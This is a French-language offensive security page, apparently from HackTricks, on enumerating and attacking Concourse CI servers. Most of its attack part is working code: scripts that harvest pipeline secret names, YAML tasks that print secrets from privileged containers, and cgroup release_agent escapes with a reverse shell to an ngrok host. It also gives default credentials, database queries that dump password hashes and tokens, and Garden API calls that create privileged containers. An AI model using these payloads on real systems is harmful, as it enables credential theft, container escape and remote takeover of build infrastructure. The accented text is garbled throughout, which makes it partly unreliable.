# Concourse Enumeration & Attacks

## Concourse Enumeration & Attacks

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

### R√¥les et Permissions des Utilisateurs

Concourse propose cinq r√¥les :

* _Concourse_ **Admin** : Ce r√¥le est uniquement attribu√© aux propri√©taires de l'**√©quipe principale** (√©quipe initiale par d√©faut de Concourse). Les administrateurs peuvent **configurer d'autres √©quipes** (par exemple : `fly set-team`, `fly destroy-team`...). Les permissions de ce r√¥le ne peuvent pas √™tre affect√©es par RBAC.
* **owner** : Les propri√©taires d'√©quipe peuvent **modifier tout au sein de l'√©quipe**.
* **member** : Les membres de l'√©quipe peuvent **lire et √©crire** dans les **ressources de l'√©quipe** mais ne peuvent pas modifier les param√®tres de l'√©quipe.
* **pipeline-operator** : Les op√©rateurs de pipeline peuvent effectuer des **op√©rations de pipeline** telles que d√©clencher des builds et √©pingler des ressources, mais ils ne peuvent pas mettre √† jour les configurations de pipeline.
* **viewer** : Les spectateurs de l'√©quipe ont un **acc√®s en lecture seule √† une √©quipe** et √† ses pipelines.

{% hint style="info" %}
De plus, les **permissions des r√¥les owner, member, pipeline-operator et viewer peuvent √™tre modifi√©es** en configurant RBAC (en configurant plus sp√©cifiquement ses actions). En savoir plus √† ce sujet : [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Notez que Concourse **regroupe les pipelines √† l'int√©rieur des √©quipes**. Par cons√©quent, les utilisateurs appartenant √† une √©quipe pourront g√©rer ces pipelines et **plusieurs √©quipes** peuvent exister. Un utilisateur peut appartenir √† plusieurs √©quipes et avoir des permissions diff√©rentes dans chacune d'elles.

### Vars & Credential Manager

Dans les configurations YAML, vous pouvez configurer des valeurs en utilisant la syntaxe `((_source-name_:_secret-path_._secret-field_))`.\
[Depuis la documentation :](https://concourse-ci.org/vars.html#var-syntax) Le **source-name est optionnel**, et s'il est omis, le [gestionnaire de cr√©dentiels √† l'√©chelle du cluster](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) sera utilis√©, ou la valeur peut √™tre fournie [statiquement](https://concourse-ci.org/vars.html#static-vars).\
Le **_secret-field_ optionnel** sp√©cifie un champ sur le secret r√©cup√©r√© √† lire. S'il est omis, le gestionnaire de cr√©dentiels peut choisir de lire un 'champ par d√©faut' √† partir du cr√©dentiel r√©cup√©r√© si le champ existe.\
De plus, le _**secret-path**_ et le _**secret-field**_ peuvent √™tre entour√©s de guillemets doubles `"..."` s'ils **contiennent des caract√®res sp√©ciaux** comme `.` et `:`. Par exemple, `((source:"my.secret"."field:1"))` d√©finira le _secret-path_ √† `my.secret` et le _secret-field_ √† `field:1`.

#### Vars Statiques

Les vars statiques peuvent √™tre sp√©cifi√©es dans les **√©tapes des t√¢ches** :
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
Ou en utilisant les **arguments** `fly` suivants :

* `-v` ou `--var` `NAME=VALUE` d√©finit la cha√Æne `VALUE` comme valeur pour la variable `NAME`.
* `-y` ou `--yaml-var` `NAME=VALUE` analyse `VALUE` en tant que YAML et le d√©finit comme valeur pour la variable `NAME`.
* `-i` ou `--instance-var` `NAME=VALUE` analyse `VALUE` en tant que YAML et le d√©finit comme valeur pour la variable d'instance `NAME`. Voir [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) pour en savoir plus sur les variables d'instance.
* `-l` ou `--load-vars-from` `FILE` charge `FILE`, un document YAML contenant des noms de variables mapp√©s √† des valeurs, et les d√©finit tous.

#### Gestion des Identifiants

Il existe diff√©rentes mani√®res de sp√©cifier un **Gestionnaire d'Identifiants** dans un pipeline, lisez comment sur [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
De plus, Concourse prend en charge diff√©rents gestionnaires d'identifiants :

* [Le gestionnaire d'identifiants Vault](https://concourse-ci.org/vault-credential-manager.html)
* [Le gestionnaire d'identifiants CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [Le gestionnaire d'identifiants AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [Le gestionnaire d'identifiants AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Le gestionnaire d'identifiants Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [Le gestionnaire d'identifiants Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [Mise en cache des identifiants](https://concourse-ci.org/creds-caching.html)
* [Masquage des identifiants](https://concourse-ci.org/creds-redacting.html)
* [R√©essayer les r√©cup√©rations √©chou√©es](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Notez que si vous avez un certain type d'**acc√®s en √©criture √† Concourse**, vous pouvez cr√©er des jobs pour **exfiltrer ces secrets** car Concourse doit pouvoir y acc√©der.
{% endhint %}

### √ânum√©ration Concourse

Pour √©num√©rer un environnement Concourse, vous devez d'abord **rassembler des identifiants valides** ou trouver un **jeton authentifi√©**, probablement dans un fichier de configuration `.flyrc`.

#### Connexion et √©num√©ration de l'utilisateur actuel

* Pour vous connecter, vous devez conna√Ætre le **point de terminaison**, le **nom de l'√©quipe** (par d√©faut `main`) et une **√©quipe √† laquelle l'utilisateur appartient** :
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Obtenir les **cibles** configur√©es :
* `fly targets`
* V√©rifier si la **connexion cible** configur√©e est toujours **valide** :
* `fly -t <target> status`
* Obtenir le **r√¥le** de l'utilisateur par rapport √† la cible indiqu√©e :
* `fly -t <target> userinfo`

{% hint style="info" %}
Notez que le **jeton API** est **enregistr√©** par d√©faut dans `$HOME/.flyrc`, en fouillant une machine, vous pourriez y trouver les identifiants.
{% endhint %}

#### √âquipes & Utilisateurs

* Obtenir une liste des √©quipes
* `fly -t <target> teams`
* Obtenir les r√¥les au sein de l'√©quipe
* `fly -t <target> get-team -n <team-name>`
* Obtenir une liste des utilisateurs
* `fly -t <target> active-users`

#### Pipelines

* **Lister** les pipelines :
* `fly -t <target> pipelines -a`
* **Obtenir** le yaml du pipeline (**des informations sensibles** peuvent √™tre trouv√©es dans la d√©finition) :
* `fly -t <target> get-pipeline -p <pipeline-name>`
* Obtenir toutes les **variables de configuration d√©clar√©es** du pipeline
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Obtenir tous les **noms de secrets utilis√©s dans les pipelines** (si vous pouvez cr√©er/modifier un job ou d√©tourner un conteneur, vous pourriez les exfiltrer) :
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
#### Containers & Workers

* Lister les **workers** :
* `fly -t <target> workers`
* Lister les **containers** :
* `fly -t <target> containers`
* Lister les **builds** (pour voir ce qui est en cours d'ex√©cution) :
* `fly -t <target> builds`

### Concourse Attacks

#### Brute-Force des Identifiants

* admin:admin
* test:test

#### √ânum√©ration des secrets et des param√®tres

Dans la section pr√©c√©dente, nous avons vu comment vous pouvez **obtenir tous les noms de secrets et les variables** utilis√©s par le pipeline. Les **variables peuvent contenir des informations sensibles** et le nom des **secrets sera utile plus tard pour essayer de les voler**.

#### Session √† l'int√©rieur d'un conteneur en cours d'ex√©cution ou r√©cemment ex√©cut√©

Si vous avez suffisamment de privil√®ges (**r√¥le de membre ou plus**), vous pourrez **lister les pipelines et les r√¥les** et simplement obtenir une **session √† l'int√©rieur** du conteneur `<pipeline>/<job>` en utilisant :
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
Avec ces permissions, vous pourriez √™tre capable de :

* **Voler les secrets** √† l'int√©rieur du **container**
* Essayer de **s'√©chapper** vers le n≈ìud
* Enum√©rer/Abuser du **cloud metadata** endpoint (depuis le pod et depuis le n≈ìud, si possible)

#### Cr√©ation/Modification de Pipeline

Si vous avez suffisamment de privil√®ges (**r√¥le de membre ou plus**), vous pourrez **cr√©er/modifier de nouveaux pipelines.** Consultez cet exemple :
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
Avec la **modification/cr√©ation** d'un nouveau pipeline, vous pourrez :

* **Voler** les **secrets** (en les affichant ou en entrant dans le conteneur et en ex√©cutant `env`)
* **√âchapper** au **n≈ìud** (en vous donnant suffisamment de privil√®ges - `privileged: true`)
* √ânum√©rer/Abuser de l'**endpoint de m√©tadonn√©es cloud** (depuis le pod et depuis le n≈ìud)
* **Supprimer** le pipeline cr√©√©

#### Ex√©cuter une T√¢che Personnalis√©e

Ceci est similaire √† la m√©thode pr√©c√©dente mais au lieu de modifier/cr√©er un tout nouveau pipeline, vous pouvez **juste ex√©cuter une t√¢che personnalis√©e** (ce qui sera probablement beaucoup plus **discret**):
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
#### √âvasion vers le n≈ìud depuis une t√¢che privil√©gi√©e

Dans les sections pr√©c√©dentes, nous avons vu comment **ex√©cuter une t√¢che privil√©gi√©e avec concourse**. Cela ne donnera pas au conteneur exactement le m√™me acc√®s que le flag privil√©gi√© dans un conteneur docker. Par exemple, vous ne verrez pas le p√©riph√©rique du syst√®me de fichiers du n≈ìud dans /dev, donc l'√©vasion pourrait √™tre plus "complexe".

Dans le PoC suivant, nous allons utiliser le release\_agent pour s'√©chapper avec quelques petites modifications :
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
Comme vous l'avez peut-√™tre remarqu√©, il s'agit simplement d'une [**regular release\_agent escape**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/concourse-security/broken-reference/README.md) modifiant simplement le chemin du cmd dans le n≈ìud.
{% endhint %}

#### √âvasion vers le n≈ìud depuis un conteneur Worker

Une regular release\_agent escape avec une l√©g√®re modification suffit pour cela :
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
#### √âvasion vers le n≈ìud depuis le conteneur Web

M√™me si le conteneur web a certaines d√©fenses d√©sactiv√©es, il **ne fonctionne pas comme un conteneur privil√©gi√© commun** (par exemple, vous **ne pouvez pas** **monter** et les **capacit√©s** sont tr√®s **limit√©es**, donc toutes les fa√ßons simples de s'√©chapper du conteneur sont inutiles).

Cependant, il stocke **des identifiants locaux en clair** :
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
Vous pouvez utiliser ces identifiants pour **vous connecter au serveur web** et **cr√©er un conteneur privil√©gi√© et √©chapper au n≈ìud**.

Dans l'environnement, vous pouvez √©galement trouver des informations pour **acc√©der √† l'instance postgresql** qu'utilise concourse (adresse, **nom d'utilisateur**, **mot de passe** et base de donn√©es parmi d'autres informations) :
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
#### Abuser le service Garden - Pas une v√©ritable attaque

{% hint style="warning" %}
Ce sont juste quelques notes int√©ressantes sur le service, mais comme il n'√©coute que sur localhost, ces notes n'auront aucun impact que nous n'avons d√©j√† exploit√© auparavant.
{% endhint %}

Par d√©faut, chaque worker de Concourse ex√©cutera un service [**Garden**](https://github.com/cloudfoundry/garden) sur le port 7777. Ce service est utilis√© par le ma√Ætre Web pour indiquer au worker **ce qu'il doit ex√©cuter** (t√©l√©charger l'image et ex√©cuter chaque t√¢che). Cela semble tr√®s int√©ressant pour un attaquant, mais il y a quelques protections efficaces :

* Il est juste **expos√© localement** (127.0.0.1) et je pense que lorsque le worker s'authentifie aupr√®s du Web avec le service SSH sp√©cial, un tunnel est cr√©√© pour que le serveur web puisse **communiquer avec chaque service Garden** √† l'int√©rieur de chaque worker.
* Le serveur web **surveille les conteneurs en cours d'ex√©cution toutes les quelques secondes**, et les conteneurs **inattendus** sont **supprim√©s**. Donc, si vous voulez **ex√©cuter un conteneur personnalis√©**, vous devez **alt√©rer** la **communication** entre le serveur web et le service Garden.

Les workers de Concourse fonctionnent avec des privil√®ges √©lev√©s sur les conteneurs :
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
Cependant, des techniques comme **monter** le p√©riph√©rique /dev du n≈ìud ou release\_agent **ne fonctionneront pas** (car le v√©ritable p√©riph√©rique avec le syst√®me de fichiers du n≈ìud n'est pas accessible, seulement un virtuel). Nous ne pouvons pas acc√©der aux processus du n≈ìud, donc s'√©chapper du n≈ìud sans exploits du noyau devient compliqu√©.

{% hint style="info" %}
Dans la section pr√©c√©dente, nous avons vu comment s'√©chapper d'un conteneur privil√©gi√©, donc si nous pouvons **ex√©cuter** des commandes dans un **conteneur privil√©gi√©** cr√©√© par le **travailleur** **actuel**, nous pourrions **nous √©chapper vers le n≈ìud**.
{% endhint %}

Notez qu'en jouant avec concourse, j'ai remarqu√© que lorsqu'un nouveau conteneur est lanc√© pour ex√©cuter quelque chose, les processus du conteneur sont accessibles depuis le conteneur de travailleur, donc c'est comme un conteneur cr√©ant un nouveau conteneur √† l'int√©rieur de lui.

**Entrer dans un conteneur privil√©gi√© en cours d'ex√©cution**
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
**Cr√©er un nouveau conteneur privil√©gi√©**

Vous pouvez tr√®s facilement cr√©er un nouveau conteneur (il suffit d'ex√©cuter un UID al√©atoire) et y ex√©cuter quelque chose :
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
Cependant, le serveur web v√©rifie toutes les quelques secondes les conteneurs en cours d'ex√©cution, et si un conteneur inattendu est d√©couvert, il sera supprim√©. Comme la communication se fait en HTTP, vous pourriez alt√©rer la communication pour √©viter la suppression des conteneurs inattendus :
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
## R√©f√©rences

* https://concourse-ci.org/vars.html

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
